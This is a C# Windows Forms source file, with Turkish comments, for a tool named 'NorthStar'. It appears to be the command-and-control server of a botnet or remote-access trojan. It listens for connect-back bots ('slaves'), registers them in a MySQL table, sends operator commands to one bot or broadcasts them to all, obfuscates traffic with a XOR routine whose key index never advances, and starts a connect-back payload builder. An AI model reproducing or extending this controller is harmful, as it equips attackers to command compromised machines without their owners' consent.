using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Collections;
using System.Threading;
using MySql.Data.MySqlClient;
using System.IO;
using System.Text.RegularExpressions;

namespace NorthStar
{
    public partial class NorthStar : Form
    {

        private static string IP;
        private static int botCount = 0;
        private static string sourcePort;
        private static string rawIP;
        private static bool isSendable = true; 
        private static string Query;
        private static string slaveName;
        private static string slavetempID;
        private static string backupQuery;
        private static string truncateQuery;
        public static string encryptionKey;
        public static string textBoxCmdAction = "command";
        public static string listenerName = "Northstar";
        public static string payloadName = "NorthPayload.exe";
        public static string prefixText;
        public static bool isPayloadNameUpdated = false;
        public static string payloadConnectBackIP;
        public static string payloadConnectBackPort;
        public static string payloadConnectBackInitialKey;
        public static string comboxTemp;
        public static bool isMysqlSetted = false;
        public static bool isKillClicked = false;
        public static string mysqlIp;
        public static bool isMysqlUpdated = false;
        public static string mysqlDbName;
        public static string ftpIp;
        public static string ftpUsername;
        public static string ftpPassword;
        public static int portToListen = 1337;
        public static bool payloadListenerCheckBox = false;
        private static int prefixLength;
        public static Hashtable slaveList = new Hashtable();
        public static Hashtable listenerList = new Hashtable();
        public static Hashtable listenerInitialKeyList = new Hashtable();
        public static Hashtable listenerEncryptionKeyList = new Hashtable();
        public static Hashtable listenerAllowedList = new Hashtable();
        public static Hashtable payloadInitialKeyList = new Hashtable();
        public static Hashtable notes = new Hashtable();
        public static List<string> listenersNameList = new List<string>();

        public static MySqlConnection conn;
       MySqlCommand command = new MySqlCommand();
        //FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://" + ftpIp);

        public NorthStar()

        {

            InitializeComponent();
            if(!isMysqlSetted)
            {
                updateLogs("[!][!] Mysql service is not setted. No data will be saved to a database. Use OPTIONS button to set it.");
                
            }


        }

        //Slavelere id üret
        private string idGenerate()
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < 13; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }

            return builder.ToString().ToUpper();

        }

        private void updateDGV(String listener)
        {
            if (InvokeRequired)
            {
                this.Invoke(new Action<string>(updateDGV), new object[] { listener }); //Threadlar arası control değişkenleriyle(textbox vs) oynamak için zorunlu.
                return;
            }
            date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
            string[] row = new string[] { Convert.ToString(botCount), listener, slaveName, IP, date, "Notes" };
            botListDGV.Rows.Add(row);
            botCount++;

        }
        private void closeConnection()
        {
            if (isMysqlSetted && conn.State == ConnectionState.Open)
            {
                try
                {
                    conn.Close();
                }
                catch (Exception ex)
                {
                    date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                    updateExceptionLogs("(" + date + ")" + " " + ex.ToString()); //SQl atarken hata alırsan hatayı exception loglarına at.
                }

            }
        }

        //Database bağlantısı kapalıysa aç.
        private void openConnection()
        {
            if (isMysqlSetted && conn.State == ConnectionState.Closed)
            {
                try
                {
                    conn.Open();
                }
                catch(Exception ex)
                {
                    date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                    updateExceptionLogs("(" + date + ")" + " " + ex.ToString()); //SQl atarken hata alırsan hatayı exception loglarına at.
                }
            }

        }



        public void executeQuery(string query, bool flag)
        {
            try
            {

                openConnection();
                command = new MySqlCommand(query, conn);

                if (flag)
                {

                    command.Parameters.AddWithValue("@SLAVENAME", slaveName);
                    command.Parameters.AddWithValue("@IP", rawIP);
                    command.Parameters.AddWithValue("@SOURCEPORT", sourcePort);
                }


                if (command.ExecuteNonQuery() != 1)
                {
                    date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                    updateExceptionLogs("(" + date + ")" + " " + query + " didn't executed! no exception code.");

                }
            }
            catch (Exception ex)
            {
                date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                updateExceptionLogs("(" + date + ")" + " " + ex.ToString()); //Hata aldıysan exception loglarını güncelle

            }
            finally
            {
                closeConnection();
            }


        }


      

        public void updateLogs(string value)
        {
            string log_query = "INSERT INTO generalLogs(logValue) values(@VALUE)"; //Dumduz sql veri tabanı güncelleme.

            if (isMysqlSetted)
            {
                try
                {
                    openConnection();
                    command = new MySqlCommand(log_query, conn);
                    command.Parameters.AddWithValue("@VALUE", value);

                    if (command.ExecuteNonQuery() != 1)
                    {
                        date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                        updateExceptionLogs("(" + date + ")" + " " + "Unable to execute query, no exception defined");
                    }
                }
                catch (Exception ex)
                {

                    date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                    updateExceptionLogs("(" + date + ")" + " " + ex.ToString()); //SQl atarken hata alırsan hatayı exception loglarına at.
                }
                finally
                {
                    closeConnection();
                }
            }


            if (InvokeRequired)
            {
                this.Invoke(new Action<string>(updateLogs), new object[] { value }); //Threadlar arası control değişkenlerini(textbox vesaire) güncellemek için zorunlu.
                return;
            }
            textBoxGeneralLogs.AppendText(value); //General Logs kutusuna değeri ekle
            textBoxGeneralLogs.AppendText(Environment.NewLine); //General logs kutusuna yeni satır ekle

        }



        //Exception loglarını güncelleyen fonksyion
        private void updateExceptionLogs(string value)
        {

            string log_query = "INSERT INTO exceptionLogs(logValue) values(@VALUE)"; //Dumduz sql veri tabanı güncelleme.

            if (isMysqlSetted)
            {
                try
                {
                    openConnection();
                    command = new MySqlCommand(log_query, conn);
                    command.Parameters.AddWithValue("@VALUE", value);

                    if (command.ExecuteNonQuery() != 1)
                    {

                    }
                }
                catch (Exception ex)
                {

                    date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                    updateExceptionLogs("(" + date + ")" + " " + ex.ToString()); //SQl atarken hata alırsan hatayı exception loglarına at.

                }
                finally
                {
                    closeConnection();
                }

            }
            if (InvokeRequired)
            {
                this.Invoke(new Action<string>(updateExceptionLogs), new object[] { value }); //Threadlar arası textboxlarla oynamak için zorunlu.
                return;
            }
            textBoxExceptionLogs.AppendText(value);
            textBoxExceptionLogs.AppendText(Environment.NewLine);
            textBoxExceptionLogs.AppendText("-----------------------------------------------------");
            textBoxExceptionLogs.AppendText(Environment.NewLine);

        }

        private void updateCmdTextBox(string value)
        {
            if (InvokeRequired) //Bu kısım gerekli, başka bir threaddan main thread üzerinde bulunan textboxları vesaire güncellemek için bunu kullanmak zorunlu
            {
                this.Invoke(new Action<string>(updateCmdTextBox), new object[] { value }); //Threadlar arası control değişkenlerinin güncellenmesi için zorunlu.
                return;
            }
            textBoxCmd.AppendText(value); //Kutuya, value değerini appen et (alt satıra ekle)


        }


        //Client dan gelen yanıtı almak için kullanılan fonksiyon
        private void getResponse(NetworkStream myNetworkStream)
        {



            StringBuilder response = new StringBuilder();

            if (myNetworkStream.CanRead)
            {
                byte[] myReadBuffer = new byte[8192];
                int numberOfBytesRead = 0;

                // Incoming message may be larger than the buffer size.
                do
                {
                    try
                    {
                        numberOfBytesRead = myNetworkStream.Read(myReadBuffer, 0, myReadBuffer.Length);

                        response.AppendFormat("{0}", Encoding.ASCII.GetString(myReadBuffer, 0, numberOfBytesRead));
                    }
                    catch(Exception ex) {
                        date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                        updateExceptionLogs("(" + date + ")" + " " + ex.ToString()); //SQl atarken hata alırsan hatayı exception loglarına at.
                    }
                }
                while (myNetworkStream.DataAvailable);


                // Print out the received message to the console.

            }
            string res = Convert.ToString(response);
            res = encryptDecrypt(res, (string)listenerEncryptionKeyList[listenerName]);

            string temp_text = Environment.NewLine + Environment.NewLine + "NORTHSTAR[" + slavetempID + "] RETURNED THE BACK:" + Environment.NewLine + Environment.NewLine + res + Environment.NewLine + Environment.NewLine + "NORTHSTAR[" + slavetempID + "]>";


            date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");

            updateCmdTextBox(temp_text);


        }

        private void broadcast(string msg, string uName, bool flag) //Tüm clientlara mesaj yollayacak olan fonksiyon
        {
            foreach (DictionaryEntry Item in slaveList) //Tüm client soketlerini gez
            {

                TcpClient broadcastSocket;  //Client soketi olarak kullanmak için oluşturulmuş bir soket
                NetworkStream broadcastStream;
                broadcastSocket = (TcpClient)Item.Value; //Olusturulan soketi, clientList içerisinde bulduğun client soketine eşitle   
                if (broadcastSocket.Connected)
                {
                    broadcastStream = broadcastSocket.GetStream(); //Bağlantıyı sağla


                    Byte[] broadcastBytes = null;

                    if (flag == true)
                    {
                    }
                    else
                    {
                        broadcastBytes = Encoding.ASCII.GetBytes(msg); //Mesajın format castingini hallet
                        //    updateLogs(msg);
                    }
                    try
                    {
                        broadcastStream.Write(broadcastBytes, 0, broadcastBytes.Length);  //Mesajı sockette bulunan client e gönder, sıra sıra tüm socketleri geziyor fonksiyon
                    }
                    catch (Exception Ex)
                    {
                        date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                        updateExceptionLogs("(" + date + ")" + " " + Ex.ToString()); //Exception alırsan exception loglarını güncelle
                    }


                    broadcastStream.Flush();
                }
                else
                {
                    updateLogs(Item.Key + " is disconnected");
                    slaveList.Remove(Item);


                }
            }
        }  //end broadcast function


        private void spesificClient(string msg, string uName) //Tüm clientlara mesaj yollayacak olan fonksiyon
        {
            TcpClient messageSocket;  //Client soketi olarak kullanmak için oluşturulmuş bir soket
            NetworkStream messageStream;
            messageSocket = (TcpClient)slaveList[uName]; //Olusturulan soketi client soketine eşitle   

            if (messageSocket.Connected)
            {
                messageStream = messageSocket.GetStream(); //Bağlantıyı sağla

                msg = encryptDecrypt(msg, (string)listenerEncryptionKeyList[listenerName]);
                Byte[] messageBytes = null;


                messageBytes = Encoding.ASCII.GetBytes(msg);
                //    updateLogs(msg);

                try
                {
                    messageStream.Write(messageBytes, 0, messageBytes.Length);
                    date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                    Task taskGetResponse = Task.Run(() => getResponse(messageStream));

                }
                catch (Exception Ex)
                {
                    date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                    updateExceptionLogs("(" + date + ")" + " " + Ex.ToString()); //Exception alırsan exception loglarını güncelle.

                }


                messageStream.Flush();
            }
            else
            {
                date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                updateLogs("(" + date + ")" + " " + uName + " is not available");
                slaveList.Remove(uName);


            }


        }


        private string encryptDecrypt(string message, string key)
        {
            StringBuilder messageStringBuild = new StringBuilder(message);
            StringBuilder keyString = new StringBuilder(key);
            int keyLenghtCount = 0;
            StringBuilder encryptedStringBuild = new StringBuilder(message.Length);

            char Textch;
            for (int iCount = 0; iCount < message.Length; iCount++)
            {
                Textch = messageStringBuild[iCount];

                Textch = (char)(Textch ^ keyString[keyLenghtCount]);
                encryptedStringBuild.Append(Textch);
                if (keyLenghtCount >= (key.Length - 1))
                {
                    keyLenghtCount = 0;
                }

            }
            return encryptedStringBuild.ToString();
        }

        private void passPhraseValidate(TcpListener serverSocket, TcpClient clientSocket, string lName)
        {
            // Check to see if this NetworkStream is readable.
            StringBuilder message = new StringBuilder();
            string phrase;
            try
            {
                NetworkStream myNetworkStream = clientSocket.GetStream();



                if (myNetworkStream.CanRead)
                {
                    byte[] myReadBuffer = new byte[8192];
                    int numberOfBytesRead = 0;

                    // Incoming message may be larger than the buffer size.
                    do
                    {
                        try
                        {
                            numberOfBytesRead = myNetworkStream.Read(myReadBuffer, 0, myReadBuffer.Length);

                            message.AppendFormat("{0}", Encoding.ASCII.GetString(myReadBuffer, 0, numberOfBytesRead));

                        }
                        catch(Exception ex) {
                            date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                            updateExceptionLogs("(" + date + ")" + " " + ex.ToString()); 
                        }
                    }
                    while (myNetworkStream.DataAvailable);
                    myNetworkStream.Flush();

                    // Print out the received message to the console.

                }
            }
            catch(Exception ex)
            {
                date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                updateExceptionLogs("(" + date + ")" + " " + ex.ToString()); //SQl atarken hata alırsan hatayı exception loglarına at.

            }
            phrase = message.ToString();
            phrase = encryptDecrypt(phrase, (string)listenerEncryptionKeyList[listenerName]);

            string clearedPhrase = Regex.Replace(phrase, @"\t|\n|\r", "");

            string key = (string)payloadInitialKeyList[payloadName];
            string listenerKey = (string)listenerInitialKeyList[listenerName];

            


            if (clearedPhrase == key || clearedPhrase == listenerKey) 
            {

                EndPoint ipNum = clientSocket.Client.RemoteEndPoint;
                IP = ipNum.ToString(); //Bağlanan slavenin ip adresini al
                rawIP = IP.Split(':')[0];
                sourcePort = IP.Split(':')[1];
                slaveName = idGenerate(); //Slavelere uniq bir ID ver


                slaveList.Add(slaveName, clientSocket); //Bağlantıyı sağlayan soketi bir hash tablosuna at
                date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                updateLogs("(" + date + ")" + " " + slaveName + " is joined"); //logları güncelle
                                                                               // broadcast(IP + " Joined \n", "", false);

                if (isMysqlSetted)
                {
                    try
                    {
                        Query = "INSERT INTO slaves(SlaveIP, SlaveJoinedDate, SlaveID, sourcePort, is_alive) values(@IP,NOW(),@SLAVENAME,@SOURCEPORT, '1')"; //database üzerine slavei koy.
                        executeQuery(Query, true); //query'i çalıştır


                    }
                    catch (Exception e)
                    {
                        date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                        updateExceptionLogs("(" + date + ")" + " " + e.ToString()); //Exception hatası aldıysak exception loglarını güncelle (Database ye koyulmadı henüz)
                    }

                }
                updateDGV(lName);

            }


        }








        //LISTENER fonksyionu
        private void listenerThread()
        {
            string name = listenerName;
            

            TcpListener serverSocket = new TcpListener(portToListen); //1337 numaralı portu dinle
            TcpClient clientSocket = default(TcpClient);
            byte[] bytesFrom = new byte[20050]; //Yanıtın maximum boyutu
            
            while (true)
            {

                if ((bool)listenerAllowedList[name]) //stoplistening tuşu basılmışmı kontrol et.
                {

                    try
                    {
                        serverSocket.Start();
                        //Veriyi al
                        clientSocket = serverSocket.AcceptTcpClient();
                    }
                    catch(Exception ex) {
                        date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                        updateExceptionLogs("(" + date + ")" + " " + ex.ToString()); }

                        Task taskValidate = Task.Run(() => passPhraseValidate(serverSocket, clientSocket, name));




                }
                else
                {
                    try
                    {
                        clientSocket.Close();
                    }
                    catch { }
                    try
                    {
                        serverSocket.Stop();
                    }
                    catch { }
                    return;
                }

            }


        }


        


        //Uygulama kapanırken
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            backupQuery = "UPDATE slaves set is_alive=0 where is_alive=1";
            truncateQuery = "TRUNCATE TABLE slaves";
            executeQuery(backupQuery, false);
            executeQuery(truncateQuery, false);
            Environment.Exit(0); //herşeyi kapat


        }

       

        //BOT listesini ilgilendiren kısım.
        private void botListDGV_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {
            if ((botListDGV.CurrentCell != null && botListDGV.CurrentCell.Value != null) && e.ColumnIndex == botListDGV.Columns["columnSlaveId"].Index) //Tıkladığın cell boş değilse
            {
                slavetempID = botListDGV.CurrentCell.Value.ToString(); //slavetempID değişkenin cell in içindeki değere ata.
                prefixText = "NORTHSTAR[";
               prefixText += botListDGV.CurrentCell.Value.ToString();
                prefixText += "]>";

                prefixLength = prefixText.Length;
                
                textBoxCmd.Text = prefixText; //cmd textboxunda bulunan NORTSTAR[slaveId]> kısmını ayarla.
            }
            else if (e.ColumnIndex == botListDGV.Columns["columnNotes"].Index)
            {
                //if (isMysqlSetted)
                //{
                    string slaveval = botListDGV.Rows[e.RowIndex].Cells[3].Value.ToString();
                    string slaveIP = slaveval.Split(':')[0];
                    Notes.slaveip = slaveIP;
                    Notes t = new Notes();
                    t.ShowDialog();

               /* }
                else
                {
                    updateLogs("Notes feature can not be used without MYSQL !");
                }
                */


              
            }


        }



        //Komut satırından komunt göndermeyle ilgili ayarlar
        private void textBoxCmd_KeyDown(object sender, KeyEventArgs e)
        {

           
            if(textBoxCmd.SelectionStart < prefixLength+1)
            {
                textBoxCmd.SelectionStart = prefixLength+1;
                textBoxCmd.SelectionLength = 0;
            }

            if (e.KeyCode == Keys.Enter) //Enter tuşuna basıldıysa
            {

                if (textBoxCmd.Text.Length > 5) //Komut satırında ki metin 5 harften büyükmü kontorl et. Kontrol etmezsen, aşağıda ki satırlarda kod patlayabilir.
                {
                    string[] textBoxCmdText = textBoxCmd.Lines[textBoxCmd.Lines.Length - 1].Split('>'); //Komut satırında ki metinden komut ve slaveID yi birbirinden ayır.
                    string command = "";

                    if (textBoxCmdAction == "command") {
                        if( textBoxCmd.Lines[textBoxCmd.Lines.Length - 1].IndexOf(">", StringComparison.OrdinalIgnoreCase) <0 )
                        {
                            isSendable = false;
                            //command = textBoxCmdText[0];
                        }
                       else
                        {
                            command = textBoxCmdText[1]; //> işaretinin sağında kalan kısım slave üzerine gönderilecek komut
                            isSendable = true;
                        }

                        if (String.Equals(slavetempID, "broadcast")) //Eğer slaveID si broadcast ise broadcast fonksiyonu çağılaracak.
                        {
                            if (isSendable)
                            {
                                broadcast(command, "", false); //Broadcast fonksyionuna komutu gönder
                                date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss"); //Güncel tarihi al
                            }
                        }
                        else
                        {
                            if (isSendable) { 
                            spesificClient(command, slavetempID); //slaveID si broadcast değilse, spesific client üzerine komnutu gönder
                            }
                        }
                    }
                    }
            }
            else if(e.KeyCode == Keys.Back)
            {
                if(textBoxCmd.Text.Length < prefixLength + 1)
                {
                    textBoxCmd.Text = prefixText+1;

                }


            }
        }

        //BROADCAST tuşu basılırsa cmd ekranında bulunan metni ayarla
        private void buttonBroadcast_Click(object sender, EventArgs e)
        {

            textBoxCmd.Text = "NORTHSTAR[BROADCAST]>";
            slavetempID = "broadcast"; //Slave ismini broadcast yap (tüm slavelere mesaj göndermek için)
        }

        private void buttonGeneralLogs_Click(object sender, EventArgs e)
        {
            textBoxGeneralLogs.Visible = true;
            textBoxExceptionLogs.Visible = false;
        }

        private void buttonExceptionLogs_Click(object sender, EventArgs e)
        {

            textBoxGeneralLogs.Visible = false;
            textBoxExceptionLogs.Visible = true;


        }

     
        private void botListDGV_MouseClick(object sender, MouseEventArgs e)
        {

            if (e.Button == MouseButtons.Right)
            {
                ContextMenuStrip actions = new System.Windows.Forms.ContextMenuStrip();
                int positionRow = botListDGV.HitTest(e.X, e.Y).RowIndex;
                int positionColumn = botListDGV.HitTest(e.X, e.Y).ColumnIndex;
                if (positionRow > -1)
                {
                    actions.Items.Add("Interact").Name = "Interact";
                    actions.Items.Add("ListUsers").Name = "ListUsers";
                }
                actions.Show(botListDGV, new Point(e.X, e.Y));

                actions.ItemClicked += new ToolStripItemClickedEventHandler((s,er)=>actions_ItemClicked(s,er,positionRow));


            }


        }

       void actions_ItemClicked(object sender, ToolStripItemClickedEventArgs e, int positionRow)
        {
           
            switch ( e.ClickedItem.Name.ToString())
            {
                case "Interact":
                    slavetempID = botListDGV[2, positionRow].Value.ToString(); //slavetempID değişkenin cell in içindeki değere ata.
                    string text = "NORTHSTAR[";
                    text += botListDGV[2, positionRow].Value.ToString();
                    text += "]>";
                    textBoxCmd.Text = text; //cmd textboxunda bulunan NORTSTAR[slaveId]> kısmını ayarla.
                    break;


            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            Payload a = new Payload();
            a.ShowDialog();
            if(isPayloadNameUpdated)
            {

                updateLogs("Payload: " + payloadName + " created. " + payloadConnectBackIP + ":" + payloadConnectBackPort+":"+payloadConnectBackInitialKey);
                isPayloadNameUpdated = false;
            }
            if(payloadListenerCheckBox)
            {
                listenerName = payloadName;

                    Thread listener_thread = new Thread(new ThreadStart(listenerThread));
                    date = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss");
                    updateLogs("(" + date + ")" + " Listener: " + listenerName + " is started on Port: " + payloadConnectBackPort);
                    Settings.listenerGo = false;
                    listener_thread.Start();
                    payloadListenerCheckBox = false;
               
            }
            
        }

    }

}

